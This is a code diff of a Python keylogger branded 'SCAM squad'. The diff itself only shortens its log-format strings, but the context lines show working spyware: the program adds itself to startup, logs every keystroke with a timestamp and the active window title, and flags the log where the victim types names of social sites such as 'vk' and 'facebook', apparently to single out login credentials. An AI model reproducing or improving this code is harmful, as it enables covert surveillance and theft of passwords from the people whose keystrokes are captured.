@@ -17,7 +17,7 @@ def add_to_startup(file_path=""):
 add_to_startup()
 
 f = open("log.txt", "a")
-f.write("---------------- SCAM squad | This computer was probably rebooted | SCAM squad---------------------\n")
+f.write("--- SCAM squad | This computer was probably rebooted | ---\n")
 f.close()
 
 str1 = ""
@@ -104,26 +104,26 @@ def on_press(key):
         global str1
         str1 += str(key)
         f = open("log.txt", "a")
-        f.write('Date and time: ' + str(datetime.datetime.now())[:16] + ' Pressed keys: ' + '{0} | '.format(key) + rusToEng(GetWindowText(GetForegroundWindow())) + "\n")
+        f.write('Dt: ' + str(datetime.datetime.now())[:16] + '{' + '{0},'.format(key) + rusToEng(GetWindowText(GetForegroundWindow())) + "}\n")
         f.close()
         if "'v''k'" in str1 or "'f''a''c''e''b''o''o''k'" in str1 or "'t''w''e''e''t''e''r'" in str1 or "'t''e''s''t''e''r'" in str1 or "'l''n''m''o'" in str1:
             f = open("log.txt", "a")
-            f.write("------ INTERESTING PLACE IN LOG ------\n")
+            f.write("- INTERESTING PLACE IN LOG -\n")
             str1 = ""
     except AttributeError:
         f = open("log.txt", "a")
-        f.write('Date and time: ' + str(datetime.datetime.now())[:16] + ' pressed keys: ' + '{0} | '.format(key) + rusToEng(GetWindowText(GetForegroundWindow())) + "\n")
+        f.write('Dt: ' + str(datetime.datetime.now())[:16] + '{' + '{0},'.format(key) + rusToEng(GetWindowText(GetForegroundWindow())) + "}\n")
         f.close()
 
 def on_release(key):
     if key == keyboard.Key.shift or key == keyboard.Key.caps_lock:
         f = open("log.txt", "a")
-        f.write('Date and time: ' + str(datetime.datetime.now())[:16] + ' Unpressed keys: ' + '{0} | '.format(key) + rusToEng(GetWindowText(GetForegroundWindow())) + "\n")
+        f.write('Dt: ' + str(datetime.datetime.now())[:16] + '{' + 'un{0},'.format(key) + rusToEng(GetWindowText(GetForegroundWindow())) + "}\n")
         f.close()
     if key == keyboard.Key.end:
         # Stop listener
         f = open("log.txt", "a")
-        f.write("---------------- SCAM squad | Key listener was stopped at " + str(datetime.datetime.now())[:16] + "| SCAM squad---------------------\n")
+        f.write("--- SCAM squad | Key listener was stopped at " + str(datetime.datetime.now())[:16] + "| ---\n")
         f.close()
         return False
 
